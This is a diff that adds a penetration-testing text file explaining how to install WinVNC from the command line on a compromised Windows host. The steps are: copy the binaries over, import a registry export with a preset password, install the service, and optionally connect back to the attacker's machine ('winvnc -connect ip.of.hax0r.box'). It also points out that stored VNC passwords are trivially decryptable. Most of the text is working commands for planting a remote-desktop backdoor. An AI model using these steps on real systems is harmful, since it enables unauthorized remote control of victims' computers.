@@ -1,0 +1,146 @@
+[ Remote VNC Installation ]
+
+
+--[ summary
+
+This document describes the process for installing the Virtual Network Computing
+remote administration software via the command line. This technique is often
+needed when performing penetration tests on Windows systems where remote 
+command execution is possible but a full interactive desktop is needed.
+
+
+--[ before you begin
+
+There are a few things you need to have obtained before you even start:
+
+Created by you:
+
+	* Registry export of the desired VNC settings (password)
+
+From the WinVNC installation:
+
+	* WinVNC.exe
+	* Omnithread_rt.dll
+	* VNCHooks.dll
+
+On the target system:
+
+	* A method of running commands at SYSTEM level
+	* A method of getting files onto the target system
+	* An application that can import registry entries (regedit)
+
+Across the network:
+
+	* Inbound access to any unused port on the server
+	 (or)
+	* Outbound access to a port on your machine
+
+
+The easiest way to obtain the VNC files and registry export is by
+installing and configuring VNC on a local machine. Set the display and
+password to whatever you like, then export the following key with regedit:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\ORL
+
+
+This should give you a file that looks like:
+
+-- begin default.reg
+REGEDIT4
+ 
+[HKEY_LOCAL_MACHINE\SOFTWARE\ORL]
+ 
+[HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3]
+ 
+[HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default]
+"SocketConnect"=dword:00000001
+"AutoPortSelect"=dword:00000001
+"PortNumber"=dword:00000000
+"InputsEnabled"=dword:00000001
+"LocalInputsDisabled"=dword:00000000
+"QuerySetting"=dword:00000002
+"QueryTimeout"=dword:0000000a
+"Password"=hex:47,c0,a6,cb,53,29,8a,fc
+"PollUnderCursor"=dword:00000000
+"PollForeground"=dword:00000001
+"PollFullScreen"=dword:00000000
+"OnlyPollConsole"=dword:00000001
+"OnlyPollOnEvent"=dword:00000000
+-- end default.reg
+
+The password is DES'd against a static string, you can always use the
+vnccrack utility to decrypt these if you find some in the wild. The 
+above password deciphers to "enis".
+
+
+
+---[ getting jiggy with it
+
+Ok, you got all your tools together and are ready to get your desktop.
+Start off by copying all three VNC files and the registry dump to the
+system via your preferred method (tftp, upload.asp, \\unc\paths).
+
+The first thing you need to do is copy those three VNC files to the
+system32 path, normally c:\winnt\system32. I have heard that this isn't
+necessary and you can place them wherever you like, but have had mixed
+results trying this. 
+
+Now you need to import the registry file, the easiest way to do this is
+via the regedit utility:
+
+C:> regedit /s c:\path\to\default.reg
+
+If this doesnt work, try running without the /s flag and let the process
+just hang there, its trying to display a message to the screen and wont
+exit until the "OK" or "CANCEL" button is clicked. On NT 4.0, either way
+will import the results, on Win2k, the /s parameter is needed to import.
+
+
+Now comes the fun stuff, installing the WinVNC service:
+
+C:> winvnc -install
+
+C:> net start winvnc
+< should get a nice message that the service is starting >
+
+C:> netstat -an
+< look for port 5800/5900 open (or whatever you set it to) >
+
+If you did everything correctly, you should be able to access this
+system by using the vncviewer client and typing in your password. If
+the server complains that a password has not been set, then your
+registry file was never successfully imported, you may need to use
+the reg.exe utility from the NT Resource Kit.
+
+
+If you dont have inbound port access, you can try sending a desktop
+back to you. You do this by first putting your client in listen mode:
+
+hax0r@mahbox:~ > vncviewer -listen
+< this opens up port 5500 on your system >
+
+
+On the server side, you run the winvnc program with the -connect option:
+
+C:> winvnc -connect ip.of.hax0r.box
+
+A display (port) number can be specified by following the hostname with a
+colon and a number. Note that all the vnc display number correlate to the
+tcp port 5900 + the display number. If you need access to lower ports, you
+can use a negative display or even wrap the number around past 65535.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
